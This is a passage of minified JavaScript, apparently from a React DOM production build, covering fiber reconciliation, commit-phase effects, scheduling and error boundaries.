ie(n),null;if(s=(n.flags&128)!==0,a=i.rendering,a===null)if(s)Bt(i,!1);else{if(K!==0||e!==null&&e.flags&128)for(e=n.child;e!==null;){if(a=Fr(e),a!==null){for(n.flags|=128,Bt(i,!1),s=a.updateQueue,s!==null&&(n.updateQueue=s,n.flags|=4),n.subtreeFlags=0,s=t,t=n.child;t!==null;)i=t,e=s,i.flags&=14680066,a=i.alternate,a===null?(i.childLanes=0,i.lanes=e,i.child=null,i.subtreeFlags=0,i.memoizedProps=null,i.memoizedState=null,i.updateQueue=null,i.dependencies=null,i.stateNode=null):(i.childLanes=a.childLanes,i.lanes=a.lanes,i.child=a.child,i.subtreeFlags=0,i.deletions=null,i.memoizedProps=a.memoizedProps,i.memoizedState=a.memoizedState,i.updateQueue=a.updateQueue,i.type=a.type,e=a.dependencies,i.dependencies=e===null?null:{lanes:e.lanes,firstContext:e.firstContext}),t=t.sibling;return D(U,U.current&1|2),n.child}e=e.sibling}i.tail!==null&&G()>Ct&&(n.flags|=128,s=!0,Bt(i,!1),n.lanes=4194304)}else{if(!s)if(e=Fr(a),e!==null){if(n.flags|=128,s=!0,t=e.updateQueue,t!==null&&(n.updateQueue=t,n.flags|=4),Bt(i,!0),i.tail===null&&i.tailMode==="hidden"&&!a.alternate&&!B)return ie(n),null}else 2*G()-i.renderingStartTime>Ct&&t!==1073741824&&(n.flags|=128,s=!0,Bt(i,!1),n.lanes=4194304);i.isBackwards?(a.sibling=n.child,n.child=a):(t=i.last,t!==null?t.sibling=a:n.child=a,i.last=a)}return i.tail!==null?(n=i.tail,i.rendering=n,i.tail=n.sibling,i.renderingStartTime=G(),n.sibling=null,t=U.current,D(U,s?t&1|2:t&1),n):(ie(n),null);case 22:case 23:return Gl(),s=n.memoizedState!==null,e!==null&&e.memoizedState!==null!==s&&(n.flags|=8192),s&&n.mode&1?ye&1073741824&&(ie(n),n.subtreeFlags&6&&(n.flags|=8192)):ie(n),null;case 24:return null;case 25:return null}throw Error(S(156,n.tag))}function um(e,n){switch(Tl(n),n.tag){case 1:return ge(n.type)&&Rr(),e=n.flags,e&65536?(n.flags=e&-65537|128,n):null;case 3:return Et(),F(me),F(le),Il(),e=n.flags,e&65536&&!(e&128)?(n.flags=e&-65537|128,n):null;case 5:return jl(n),null;case 13:if(F(U),e=n.memoizedState,e!==null&&e.dehydrated!==null){if(n.alternate===null)throw Error(S(340));St()}return e=n.flags,e&65536?(n.flags=e&-65537|128,n):null;case 19:return F(U),null;case 4:return Et(),null;case 10:return Pl(n.type._context),null;case 22:case 23:return Gl(),null;case 24:return null;default:return null}}var er=!1,ae=!1,pm=typeof WeakSet=="function"?WeakSet:Set,N=null;function dt(e,n){var t=e.ref;if(t!==null)if(typeof t=="function")try{t(null)}catch(s){W(e,n,s)}else t.current=null}function Ba(e,n,t){try{t()}catch(s){W(e,n,s)}}var cc=!1;function dm(e,n){if(Sa=Nr,e=np(),_l(e)){if("selectionStart"in e)var t={start:e.selectionStart,end:e.selectionEnd};else e:{t=(t=e.ownerDocument)&&t.defaultView||window;var s=t.getSelection&&t.getSelection();if(s&&s.rangeCount!==0){t=s.anchorNode;var r=s.anchorOffset,i=s.focusNode;s=s.focusOffset;try{t.nodeType,i.nodeType}catch{t=null;break e}var a=0,l=-1,o=-1,c=0,p=0,d=e,h=null;n:for(;;){for(var v;d!==t||r!==0&&d.nodeType!==3||(l=a+r),d!==i||s!==0&&d.nodeType!==3||(o=a+s),d.nodeType===3&&(a+=d.nodeValue.length),(v=d.firstChild)!==null;)h=d,d=v;for(;;){if(d===e)break n;if(h===t&&++c===r&&(l=a),h===i&&++p===s&&(o=a),(v=d.nextSibling)!==null)break;d=h,h=d.parentNode}d=v}t=l===-1||o===-1?null:{start:l,end:o}}else t=null}t=t||{start:0,end:0}}else t=null;for(_a={focusedElem:e,selectionRange:t},Nr=!1,N=n;N!==null;)if(n=N,e=n.child,(n.subtreeFlags&1028)!==0&&e!==null)e.return=n,N=e;else for(;N!==null;){n=N;try{var y=n.alternate;if(n.flags&1024)switch(n.tag){case 0:case 11:case 15:break;case 1:if(y!==null){var w=y.memoizedProps,x=y.memoizedState,m=n.stateNode,f=m.getSnapshotBeforeUpdate(n.elementType===n.type?w:Le(n.type,w),x);m.__reactInternalSnapshotBeforeUpdate=f}break;case 3:var g=n.stateNode.containerInfo;g.nodeType===1?g.textContent="":g.nodeType===9&&g.documentElement&&g.removeChild(g.documentElement);break;case 5:case 6:case 4:case 17:break;default:throw Error(S(163))}}catch(k){W(n,n.return,k)}if(e=n.sibling,e!==null){e.return=n.return,N=e;break}N=n.return}return y=cc,cc=!1,y}function ss(e,n,t){var s=n.updateQueue;if(s=s!==null?s.lastEffect:null,s!==null){var r=s=s.next;do{if((r.tag&e)===e){var i=r.destroy;r.destroy=void 0,i!==void 0&&Ba(n,t,i)}r=r.next}while(r!==s)}}function ui(e,n){if(n=n.updateQueue,n=n!==null?n.lastEffect:null,n!==null){var t=n=n.next;do{if((t.tag&e)===e){var s=t.create;t.destroy=s()}t=t.next}while(t!==n)}}function Ua(e){var n=e.ref;if(n!==null){var t=e.stateNode;switch(e.tag){case 5:e=t;break;default:e=t}typeof n=="function"?n(e):n.current=e}}function Qp(e){var n=e.alternate;n!==null&&(e.alternate=null,Qp(n)),e.child=null,e.deletions=null,e.sibling=null,e.tag===5&&(n=e.stateNode,n!==null&&(delete n[Ve],delete n[gs],delete n[Ca],delete n[qf],delete n[Xf])),e.stateNode=null,e.return=null,e.dependencies=null,e.memoizedProps=null,e.memoizedState=null,e.pendingProps=null,e.stateNode=null,e.updateQueue=null}function Zp(e){return e.tag===5||e.tag===3||e.tag===4}function uc(e){e:for(;;){for(;e.sibling===null;){if(e.return===null||Zp(e.return))return null;e=e.return}for(e.sibling.return=e.return,e=e.sibling;e.tag!==5&&e.tag!==6&&e.tag!==18;){if(e.flags&2||e.child===null||e.tag===4)continue e;e.child.return=e,e=e.child}if(!(e.flags&2))return e.stateNode}}function Ha(e,n,t){var s=e.tag;if(s===5||s===6)e=e.stateNode,n?t.nodeType===8?t.parentNode.insertBefore(e,n):t.insertBefore(e,n):(t.nodeType===8?(n=t.parentNode,n.insertBefore(e,t)):(n=t,n.appendChild(e)),t=t._reactRootContainer,t!=null||n.onclick!==null||(n.onclick=Lr));else if(s!==4&&(e=e.child,e!==null))for(Ha(e,n,t),e=e.sibling;e!==null;)Ha(e,n,t),e=e.sibling}function Va(e,n,t){var s=e.tag;if(s===5||s===6)e=e.stateNode,n?t.insertBefore(e,n):t.appendChild(e);else if(s!==4&&(e=e.child,e!==null))for(Va(e,n,t),e=e.sibling;e!==null;)Va(e,n,t),e=e.sibling}var ee=null,Re=!1;function cn(e,n,t){for(t=t.child;t!==null;)Jp(e,n,t),t=t.sibling}function Jp(e,n,t){if(We&&typeof We.onCommitFiberUnmount=="function")try{We.onCommitFiberUnmount(ti,t)}catch{}switch(t.tag){case 5:ae||dt(t,n);case 6:var s=ee,r=Re;ee=null,cn(e,n,t),ee=s,Re=r,ee!==null&&(Re?(e=ee,t=t.stateNode,e.nodeType===8?e.parentNode.removeChild(t):e.removeChild(t)):ee.removeChild(t.stateNode));break;case 18:ee!==null&&(Re?(e=ee,t=t.stateNode,e.nodeType===8?Ui(e.parentNode,t):e.nodeType===1&&Ui(e,t),ps(e)):Ui(ee,t.stateNode));break;case 4:s=ee,r=Re,ee=t.stateNode.containerInfo,Re=!0,cn(e,n,t),ee=s,Re=r;break;case 0:case 11:case 14:case 15:if(!ae&&(s=t.updateQueue,s!==null&&(s=s.lastEffect,s!==null))){r=s=s.next;do{var i=r,a=i.destroy;i=i.tag,a!==void 0&&(i&2||i&4)&&Ba(t,n,a),r=r.next}while(r!==s)}cn(e,n,t);break;case 1:if(!ae&&(dt(t,n),s=t.stateNode,typeof s.componentWillUnmount=="function"))try{s.props=t.memoizedProps,s.state=t.memoizedState,s.componentWillUnmount()}catch(l){W(t,n,l)}cn(e,n,t);break;case 21:cn(e,n,t);break;case 22:t.mode&1?(ae=(s=ae)||t.memoizedState!==null,cn(e,n,t),ae=s):cn(e,n,t);break;default:cn(e,n,t)}}function pc(e){var n=e.updateQueue;if(n!==null){e.updateQueue=null;var t=e.stateNode;t===null&&(t=e.stateNode=new pm),n.forEach(function(s){var r=bm.bind(null,e,s);t.has(s)||(t.add(s),s.then(r,r))})}}function Pe(e,n){var t=n.deletions;if(t!==null)for(var s=0;s<t.length;s++){var r=t[s];try{var i=e,a=n,l=a;e:for(;l!==null;){switch(l.tag){case 5:ee=l.stateNode,Re=!1;break e;case 3:ee=l.stateNode.containerInfo,Re=!0;break e;case 4:ee=l.stateNode.containerInfo,Re=!0;break e}l=l.return}if(ee===null)throw Error(S(160));Jp(i,a,r),ee=null,Re=!1;var o=r.alternate;o!==null&&(o.return=null),r.return=null}catch(c){W(r,n,c)}}if(n.subtreeFlags&12854)for(n=n.child;n!==null;)ed(n,e),n=n.sibling}function ed(e,n){var t=e.alternate,s=e.flags;switch(e.tag){case 0:case 11:case 14:case 15:if(Pe(n,e),Ue(e),s&4){try{ss(3,e,e.return),ui(3,e)}catch(w){W(e,e.return,w)}try{ss(5,e,e.return)}catch(w){W(e,e.return,w)}}break;case 1:Pe(n,e),Ue(e),s&512&&t!==null&&dt(t,t.return);break;case 5:if(Pe(n,e),Ue(e),s&512&&t!==null&&dt(t,t.return),e.flags&32){var r=e.stateNode;try{ls(r,"")}catch(w){W(e,e.return,w)}}if(s&4&&(r=e.stateNode,r!=null)){var i=e.memoizedProps,a=t!==null?t.memoizedProps:i,l=e.type,o=e.updateQueue;if(e.updateQueue=null,o!==null)try{l==="input"&&i.type==="radio"&&i.name!=null&&xu(r,i),ha(l,a);var c=ha(l,i);for(a=0;a<o.length;a+=2){var p=o[a],d=o[a+1];p==="style"?Cu(r,d):p==="dangerouslySetInnerHTML"?Eu(r,d):p==="children"?ls(r,d):pl(r,p,d,c)}switch(l){case"input":oa(r,i);break;case"textarea":Su(r,i);break;case"select":var h=r._wrapperState.wasMultiple;r._wrapperState.wasMultiple=!!i.multiple;var v=i.value;v!=null?ft(r,!!i.multiple,v,!1):h!==!!i.multiple&&(i.defaultValue!=null?ft(r,!!i.multiple,i.defaultValue,!0):ft(r,!!i.multiple,i.multiple?[]:"",!1))}r[gs]=i}catch(w){W(e,e.return,w)}}break;case 6:if(Pe(n,e),Ue(e),s&4){if(e.stateNode===null)throw Error(S(162));r=e.stateNode,i=e.memoizedProps;try{r.nodeValue=i}catch(w){W(e,e.return,w)}}break;case 3:if(Pe(n,e),Ue(e),s&4&&t!==null&&t.memoizedState.isDehydrated)try{ps(n.containerInfo)}catch(w){W(e,e.return,w)}break;case 4:Pe(n,e),Ue(e);break;case 13:Pe(n,e),Ue(e),r=e.child,r.flags&8192&&(i=r.memoizedState!==null,r.stateNode.isHidden=i,!i||r.alternate!==null&&r.alternate.memoizedState!==null||(Wl=G())),s&4&&pc(e);break;case 22:if(p=t!==null&&t.memoizedState!==null,e.mode&1?(ae=(c=ae)||p,Pe(n,e),ae=c):Pe(n,e),Ue(e),s&8192){if(c=e.memoizedState!==null,(e.stateNode.isHidden=c)&&!p&&e.mode&1)for(N=e,p=e.child;p!==null;){for(d=N=p;N!==null;){switch(h=N,v=h.child,h.tag){case 0:case 11:case 14:case 15:ss(4,h,h.return);break;case 1:dt(h,h.return);var y=h.stateNode;if(typeof y.componentWillUnmount=="function"){s=h,t=h.return;try{n=s,y.props=n.memoizedProps,y.state=n.memoizedState,y.componentWillUnmount()}catch(w){W(s,t,w)}}break;case 5:dt(h,h.return);break;case 22:if(h.memoizedState!==null){hc(d);continue}}v!==null?(v.return=h,N=v):hc(d)}p=p.sibling}e:for(p=null,d=e;;){if(d.tag===5){if(p===null){p=d;try{r=d.stateNode,c?(i=r.style,typeof i.setProperty=="function"?i.setProperty("display","none","important"):i.display="none"):(l=d.stateNode,o=d.memoizedProps.style,a=o!=null&&o.hasOwnProperty("display")?o.display:null,l.style.display=Tu("display",a))}catch(w){W(e,e.return,w)}}}else if(d.tag===6){if(p===null)try{d.stateNode.nodeValue=c?"":d.memoizedProps}catch(w){W(e,e.return,w)}}else if((d.tag!==22&&d.tag!==23||d.memoizedState===null||d===e)&&d.child!==null){d.child.return=d,d=d.child;continue}if(d===e)break e;for(;d.sibling===null;){if(d.return===null||d.return===e)break e;p===d&&(p=null),d=d.return}p===d&&(p=null),d.sibling.return=d.return,d=d.sibling}}break;case 19:Pe(n,e),Ue(e),s&4&&pc(e);break;case 21:break;default:Pe(n,e),Ue(e)}}function Ue(e){var n=e.flags;if(n&2){try{e:{for(var t=e.return;t!==null;){if(Zp(t)){var s=t;break e}t=t.return}throw Error(S(160))}switch(s.tag){case 5:var r=s.stateNode;s.flags&32&&(ls(r,""),s.flags&=-33);var i=uc(e);Va(e,i,r);break;case 3:case 4:var a=s.stateNode.containerInfo,l=uc(e);Ha(e,l,a);break;default:throw Error(S(161))}}catch(o){W(e,e.return,o)}e.flags&=-3}n&4096&&(e.flags&=-4097)}function hm(e,n,t){N=e,nd(e)}function nd(e,n,t){for(var s=(e.mode&1)!==0;N!==null;){var r=N,i=r.child;if(r.tag===22&&s){var a=r.memoizedState!==null||er;if(!a){var l=r.alternate,o=l!==null&&l.memoizedState!==null||ae;l=er;var c=ae;if(er=a,(ae=o)&&!c)for(N=r;N!==null;)a=N,o=a.child,a.tag===22&&a.memoizedState!==null?fc(r):o!==null?(o.return=a,N=o):fc(r);for(;i!==null;)N=i,nd(i),i=i.sibling;N=r,er=l,ae=c}dc(e)}else r.subtreeFlags&8772&&i!==null?(i.return=r,N=i):dc(e)}}function dc(e){for(;N!==null;){var n=N;if(n.flags&8772){var t=n.alternate;try{if(n.flags&8772)switch(n.tag){case 0:case 11:case 15:ae||ui(5,n);break;case 1:var s=n.stateNode;if(n.flags&4&&!ae)if(t===null)s.componentDidMount();else{var r=n.elementType===n.type?t.memoizedProps:Le(n.type,t.memoizedProps);s.componentDidUpdate(r,t.memoizedState,s.__reactInternalSnapshotBeforeUpdate)}var i=n.updateQueue;i!==null&&Ko(n,i,s);break;case 3:var a=n.updateQueue;if(a!==null){if(t=null,n.child!==null)switch(n.child.tag){case 5:t=n.child.stateNode;break;case 1:t=n.child.stateNode}Ko(n,a,t)}break;case 5:var l=n.stateNode;if(t===null&&n.flags&4){t=l;var o=n.memoizedProps;switch(n.type){case"button":case"input":case"select":case"textarea":o.autoFocus&&t.focus();break;case"img":o.src&&(t.src=o.src)}}break;case 6:break;case 4:break;case 12:break;case 13:if(n.memoizedState===null){var c=n.alternate;if(c!==null){var p=c.memoizedState;if(p!==null){var d=p.dehydrated;d!==null&&ps(d)}}}break;case 19:case 17:case 21:case 22:case 23:case 25:break;default:throw Error(S(163))}ae||n.flags&512&&Ua(n)}catch(h){W(n,n.return,h)}}if(n===e){N=null;break}if(t=n.sibling,t!==null){t.return=n.return,N=t;break}N=n.return}}function hc(e){for(;N!==null;){var n=N;if(n===e){N=null;break}var t=n.sibling;if(t!==null){t.return=n.return,N=t;break}N=n.return}}function fc(e){for(;N!==null;){var n=N;try{switch(n.tag){case 0:case 11:case 15:var t=n.return;try{ui(4,n)}catch(o){W(n,t,o)}break;case 1:var s=n.stateNode;if(typeof s.componentDidMount=="function"){var r=n.return;try{s.componentDidMount()}catch(o){W(n,r,o)}}var i=n.return;try{Ua(n)}catch(o){W(n,i,o)}break;case 5:var a=n.return;try{Ua(n)}catch(o){W(n,a,o)}}}catch(o){W(n,n.return,o)}if(n===e){N=null;break}var l=n.sibling;if(l!==null){l.return=n.return,N=l;break}N=n.return}}var fm=Math.ceil,Hr=ln.ReactCurrentDispatcher,Hl=ln.ReactCurrentOwner,Ce=ln.ReactCurrentBatchConfig,j=0,J=null,Y=null,ne=0,ye=0,ht=Ln(0),K=0,xs=null,Xn=0,pi=0,Vl=0,rs=null,de=null,Wl=0,Ct=1/0,Ke=null,Vr=!1,Wa=null,_n=null,nr=!1,vn=null,Wr=0,is=0,$a=null,vr=-1,yr=0;function ce(){return j&6?G():vr!==-1?vr:vr=G()}function En(e){return e.mode&1?j&2&&ne!==0?ne&-ne:Qf.transition!==null?(yr===0&&(yr=Fu()),yr):(e=M,e!==0||(e=window.event,e=e===void 0?16:Gu(e.type)),e):1}function De(e,n,t,s){if(50<is)throw is=0,$a=null,Error(S(185));Ps(e,t,s),(!(j&2)||e!==J)&&(e===J&&(!(j&2)&&(pi|=t),K===4&&mn(e,ne)),ve(e,s),t===1&&j===0&&!(n.mode&1)&&(Ct=G()+500,li&&Rn()))}function ve(e,n){var t=e.callbackNode;Kh(e,n);var s=Cr(e,e===J?ne:0);if(s===0)t!==null&&So(t),e.callbackNode=null,e.callbackPriority=0;else if(n=s&-s,e.callbackPriority!==n){if(t!=null&&So(t),n===1)e.tag===0?Kf(mc.bind(null,e)):pp(mc.bind(null,e)),Gf(function(){!(j&6)&&Rn()}),t=null;else{switch(Bu(s)){case 1:t=gl;break;case 4:t=Du;break;case 16:t=Tr;break;case 536870912:t=zu;break;default:t=Tr}t=cd(t,td.bind(null,e))}e.callbackPriority=n,e.callbackNode=t}}function td(e,n){if(vr=-1,yr=0,j&6)throw Error(S(327));var t=e.callbackNode;if(wt()&&e.callbackNode!==t)return null;var s=Cr(e,e===J?ne:0);if(s===0)return null;if(s&30||s&e.expiredLanes||n)n=$r(e,s);else{n=s;var r=j;j|=2;var i=rd();(J!==e||ne!==n)&&(Ke=null,Ct=G()+500,Hn(e,n));do try{vm();break}catch(l){sd(e,l)}while(!0);Al(),Hr.current=i,j=r,Y!==null?n=0:(J=null,ne=0,n=K)}if(n!==0){if(n===2&&(r=ya(e),r!==0&&(s=r,n=Ga(e,r))),n===1)throw t=xs,Hn(e,0),mn(e,s),ve(e,G()),t;if(n===6)mn(e,s);else{if(r=e.current.alternate,!(s&30)&&!mm(r)&&(n=$r(e,s),n===2&&(i=ya(e),i!==0&&(s=i,n=Ga(e,i))),n===1))throw t=xs,Hn(e,0),mn(e,s),ve(e,G()),t;switch(e.finishedWork=r,e.finishedLanes=s,n){case 0:case 1:throw Error(S(345));case 2:Dn(e,de,Ke);break;case 3:if(mn(e,s),(s&130023424)===s&&(n=Wl+500-G(),10<n)){if(Cr(e,0)!==0)break;if(r=e.suspendedLanes,(r&s)!==s){ce(),e.pingedLanes|=e.suspendedLanes&r;break}e.timeoutHandle=Ta(Dn.bind(null,e,de,Ke),n);break}Dn(e,de,Ke);break;case 4:if(mn(e,s),(s&4194240)===s)break;for(n=e.eventTimes,r=-1;0<s;){var a=31-Me(s);i=1<<a,a=n[a],a>r&&(r=a),s&=~i}if(s=r,s=G()-s,s=(120>s?120:480>s?480:1080>s?1080:1920>s?1920:3e3>s?3e3:4320>s?4320:1960*fm(s/1960))-s,10<s){e.timeoutHandle=Ta(Dn.bind(null,e,de,Ke),s);break}Dn(e,de,Ke);break;case 5:Dn(e,de,Ke);break;default:throw Error(S(329))}}}return ve(e,G()),e.callbackNode===t?td.bind(null,e):null}function Ga(e,n){var t=rs;return e.current.memoizedState.isDehydrated&&(Hn(e,n).flags|=256),e=$r(e,n),e!==2&&(n=de,de=t,n!==null&&Ya(n)),e}function Ya(e){de===null?de=e:de.push.apply(de,e)}function mm(e){for(var n=e;;){if(n.flags&16384){var t=n.updateQueue;if(t!==null&&(t=t.stores,t!==null))for(var s=0;s<t.length;s++){var r=t[s],i=r.getSnapshot;r=r.value;try{if(!ze(i(),r))return!1}catch{return!1}}}if(t=n.child,n.subtreeFlags&16384&&t!==null)t.return=n,n=t;else{if(n===e)break;for(;n.sibling===null;){if(n.return===null||n.return===e)return!0;n=n.return}n.sibling.return=n.return,n=n.sibling}}return!0}function mn(e,n){for(n&=~Vl,n&=~pi,e.suspendedLanes|=n,e.pingedLanes&=~n,e=e.expirationTimes;0<n;){var t=31-Me(n),s=1<<t;e[t]=-1,n&=~s}}function mc(e){if(j&6)throw Error(S(327));wt();var n=Cr(e,0);if(!(n&1))return ve(e,G()),null;var t=$r(e,n);if(e.tag!==0&&t===2){var s=ya(e);s!==0&&(n=s,t=Ga(e,s))}if(t===1)throw t=xs,Hn(e,0),mn(e,n),ve(e,G()),t;if(t===6)throw Error(S(345));return e.finishedWork=e.current.alternate,e.finishedLanes=n,Dn(e,de,Ke),ve(e,G()),null}function $l(e,n){var t=j;j|=1;try{return e(n)}finally{j=t,j===0&&(Ct=G()+500,li&&Rn())}}function Kn(e){vn!==null&&vn.tag===0&&!(j&6)&&wt();var n=j;j|=1;var t=Ce.transition,s=M;try{if(Ce.transition=null,M=1,e)return e()}finally{M=s,Ce.transition=t,j=n,!(j&6)&&Rn()}}function Gl(){ye=ht.current,F(ht)}function Hn(e,n){e.finishedWork=null,e.finishedLanes=0;var t=e.timeoutHandle;if(t!==-1&&(e.timeoutHandle=-1,$f(t)),Y!==null)for(t=Y.return;t!==null;){var s=t;switch(Tl(s),s.tag){case 1:s=s.type.childContextTypes,s!=null&&Rr();break;case 3:Et(),F(me),F(le),Il();break;case 5:jl(s);break;case 4:Et();break;case 13:F(U);break;case 19:F(U);break;case 10:Pl(s.type._context);break;case 22:case 23:Gl()}t=t.return}if(J=e,Y=e=Tn(e.current,null),ne=ye=n,K=0,xs=null,Vl=pi=Xn=0,de=rs=null,Fn!==null){for(n=0;n<Fn.length;n++)if(t=Fn[n],s=t.interleaved,s!==null){t.interleaved=null;var r=s.next,i=t.pending;if(i!==null){var a=i.next;i.next=r,s.next=a}t.pending=s}Fn=null}return e}function sd(e,n){do{var t=Y;try{if(Al(),fr.current=Ur,Br){for(var s=H.memoizedState;s!==null;){var r=s.queue;r!==null&&(r.pending=null),s=s.next}Br=!1}if(qn=0,Z=X=H=null,ts=!1,ws=0,Hl.current=null,t===null||t.return===null){K=1,xs=n,Y=null;break}e:{var i=e,a=t.return,l=t,o=n;if(n=ne,l.flags|=32768,o!==null&&typeof o=="object"&&typeof o.then=="function"){var c=o,p=l,d=p.tag;if(!(p.mode&1)&&(d===0||d===11||d===15)){var h=p.alternate;h?(p.updateQueue=h.updateQueue,p.memoizedState=h.memoizedState,p.lanes=h.lanes):(p.updateQueue=null,p.memoizedState=null)}var v=tc(a);if(v!==null){v.flags&=-257,sc(v,a,l,i,n),v.mode&1&&nc(i,c,n),n=v,o=c;var y=n.updateQueue;if(y===null){var w=new Set;w.add(o),n.updateQueue=w}else y.add(o);break e}else{if(!(n&1)){nc(i,c,n),Yl();break e}o=Error(S(426))}}else if(B&&l.mode&1){var x=tc(a);if(x!==null){!(x.flags&65536)&&(x.flags|=256),sc(x,a,l,i,n),Cl(Tt(o,l));break e}}i=o=Tt(o,l),K!==4&&(K=2),rs===null?rs=[i]:rs.push(i),i=a;do{switch(i.tag){case 3:i.flags|=65536,n&=-n,i.lanes|=n;var m=Bp(i,o,n);Xo(i,m);break e;case 1:l=o;var f=i.type,g=i.stateNode;if(!(i.flags&128)&&(typeof f.getDerivedStateFromError=="function"||g!==null&&typeof g.componentDidCatch=="function"&&(_n===null||!_n.has(g)))){i.flags|=65536,n&=-n,i.lanes|=n;var k=Up(i,l,n);Xo(i,k);break e}}i=i.return}while(i!==null)}ad(t)}catch(_){n=_,Y===t&&t!==null&&(Y=t=t.return);continue}break}while(!0)}function rd(){var e=Hr.current;return Hr.current=Ur,e===null?Ur:e}function Yl(){(K===0||K===3||K===2)&&(K=4),J===null||!(Xn&268435455)&&!(pi&268435455)||mn(J,ne)}function $r(e,n){var t=j;j|=2;var s=rd();(J!==e||ne!==n)&&(Ke=null,Hn(e,n));do try{gm();break}catch(r){sd(e,r)}while(!0);if(Al(),j=t,Hr.current=s,Y!==null)throw Error(S(261));return J=null,ne=0,K}function gm(){for(;Y!==null;)id(Y)}function vm(){for(;Y!==null&&!Uh();)id(Y)}function id(e){var n=od(e.alternate,e,ye);e.memoizedProps=e.pendingProps,n===null?ad(e):Y=n,Hl.current=null}function ad(e){var n=e;do{var t=n.alternate;if(e=n.return,n.flags&32768){if(t=um(t,n),t!==null){t.flags&=32767,Y=t;return}if(e!==null)e.flags|=32768,e.subtreeFlags=0,e.deletions=null;else{K=6,Y=null;return}}else if(t=cm(t,n,ye),t!==null){Y=t;return}if(n=n.sibling,n!==null){Y=n;return}Y=n=e}while(n!==null);K===0&&(K=5)}function Dn(e,n,t){var s=M,r=Ce.transition;try{Ce.transition=null,M=1,ym(e,n,t,s)}finally{Ce.transition=r,M=s}return null}function ym(e,n,t,s){do wt();while(vn!==null);if(j&6)throw Error(S(327));t=e.finishedWork;var r=e.finishedLanes;if(t===null)return null;if(e.finishedWork=null,e.finishedLanes=0,t===e.current)throw Error(S(177));e.callbackNode=null,e.callbackPriority=0;var i=t.lanes|t.childLanes;if(Qh(e,i),e===J&&(Y=J=null,ne=0),!(t.subtreeFlags&2064)&&!(t.flags&2064)||nr||(nr=!0,cd(Tr,function(){return wt(),null})),i=(t.flags&15990)!==0,t.subtreeFlags&15990||i){i=Ce.transition,Ce.transition=null;var a=M;M=1;var l=j;j|=4,Hl.current=null,dm(e,t),ed(t,e),zf(_a),Nr=!!Sa,_a=Sa=null,e.current=t,hm(t),Hh(),j=l,M=a,Ce.transition=i}else e.current=t;if(nr&&(nr=!1,vn=e,Wr=r),i=e.pendingLanes,i===0&&(_n=null),$h(t.stateNode),ve(e,G()),n!==null)for(s=e.onRecoverableError,t=0;t<n.length;t++)r=n[t],s(r.value,{componentStack:r.stack,digest:r.digest});if(Vr)throw Vr=!1,e=Wa,Wa=null,e;return Wr&1&&e.tag!==0&&wt(),i=e.pendingLanes,i&1?e===$a?is++:(is=0,$a=e):is=0,Rn(),null}function wt(){if(vn!==null){var e=Bu(Wr),n=Ce.transition,t=M;try{if(Ce.transition=null,M=16>e?16:e,vn===null)var s=!1;else{if(e=vn,vn=null,Wr=0,j&6)throw Error(S(331));var r=j;for(j|=4,N=e.current;N!==null;){var i=N,a=i.child;if(N.flags&16){var l=i.deletions;if(l!==null){for(var o=0;o<l.length;o++){var c=l[o];for(N=c;N!==null;){var p=N;switch(p.tag){case 0:case 11:case 15:ss(8,p,i)}var d=p.child;if(d!==null)d.return=p,N=d;else for(;N!==null;){p=N;var h=p.sibling,v=p.return;if(Qp(p),p===c){N=null;break}if(h!==null){h.return=v,N=h;break}N=v}}}var y=i.alternate;if(y!==null){var w=y.child;if(w!==null){y.child=null;do{var x=w.sibling;w.sibling=null,w=x}while(w!==null)}}N=i}}if(i.subtreeFlags&2064&&a!==null)a.return=i,N=a;else e:for(;N!==null;){if(i=N,i.flags&2048)switch(i.tag){case 0:case 11:case 15:ss(9,i,i.return)}var m=i.sibling;if(m!==null){m.return=i.return,N=m;break e}N=i.return}}var f=e.current;for(N=f;N!==null;){a=N;var g=a.child;if(a.subtreeFlags&2064&&g!==null)g.return=a,N=g;else e:for(a=f;N!==null;){if(l=N,l.flags&2048)try{switch(l.tag){case 0:case 11:case 15:ui(9,l)}}catch(_){W(l,l.return,_)}if(l===a){N=null;break e}var k=l.sibling;if(k!==null){k.return=l.return,N=k;break e}N=l.return}}if(j=r,Rn(),We&&typeof We.onPostCommitFiberRoot=="function")try{We.onPostCommitFiberRoot(ti,e)}catch{}s=!0}return s}finally{M=t,Ce.transition=n}}return!1}function gc(e,n,t){n=Tt(t,n),n=Bp(e,n,1),e=Sn(e,n,1),n=ce(),e!==null&&(Ps(e,1,n),ve(e,n))}function W(e,n,t){if(e.tag===3)gc(e,e,t);else for(;n!==null;){if(n.tag===3){gc(n,e,t);break}else if(n.tag===1){var s=n.stateNode;if(typeof n.type.getDerivedStateFromError=="function"||typeof s.componentDidCatch=="function"&&(_n===null||!_n.has(s))){e=Tt(t,e),e=Up(n,e,1),n=Sn(n,e,1),e=ce(),n!==null&&(Ps(n,1,e),ve(n,e));break}}n=n.return}}function wm(e,n,t){var s=e.pingCache;s!==null&&s.delete(n),n=ce(),e.pingedLanes|=e.suspendedLanes&t,J===e&&(ne&t)===t&&(K===4||K===3&&(ne&130023424)===ne&&500>G()-Wl?Hn(e,0):Vl|=t),ve(e,n)}function ld(e,n){n===0&&(e.mode&1?(n=$s,$s<<=1,!($s&130023424)&&($s=4194304)):n=1);var t=ce();e=sn(e,n),e!==null&&(Ps(e,n,t),ve(e,t))}function km(e){var n=e.memoizedState,t=0;n!==null&&(t=n.retryLane),ld(e,t)}function bm(e,n){var t=0;switch(e.tag){case 13:var s=e.stateNode,r=e.memoizedState;r!==null&&(t=r.retryLane);break;case 19:s=e.stateNode;break;default:throw Error(S(314))}s!==null&&s.delete(n),ld(e,t)}var od;od=function(e,n,t){if(e!==null)if(e.memoizedProps!==n.pendingProps||me.current)he=!0;else{if(!(e.lanes&t)&&!(n.flags&128))return he=!1,om(e,n,t);he=!!(e.flags&131072)}else he=!1,B&&n.flags&1048576&&dp(n,Ir,n.index);switch(n.lanes=0,n.tag){case 2:var s=n.type;gr(e,n),e=n.pendingProps;var r=xt(n,le.current);yt(n,t),r=Dl(null,n,s,e,r,t);var i=zl();return n.flags|=1,typeof r=="object"&&r!==null&&typeof r.render=="function"&&r.$$typeof===void 0?(n.tag=1,n.memoizedState=null,n.updateQueue=null,ge(s)?(i=!0,Or(n)):i=!1,n.memoizedState=r.state!==null&&r.state!==void 0?r.state:null,Rl(n),r.updater=ci,n.stateNode=r,r._reactInternals=n,Oa(n,s,e,t),n=Ma(null,n,s,!0,i,t)):(n.tag=0,B&&i&&El(n),oe(null,n,r,t),n=n.child),n;case 16:s=n.elementType;e:{switch(gr(e,n),e=n.pendingProps,r=s._init,s=r(s._payload),n.type=s,r=n.tag=Sm(s),e=Le(s,e),r){case 0:n=Ia(null,n,s,e,t);break e;case 1:n=ac(null,n,s,e,t);break e;case 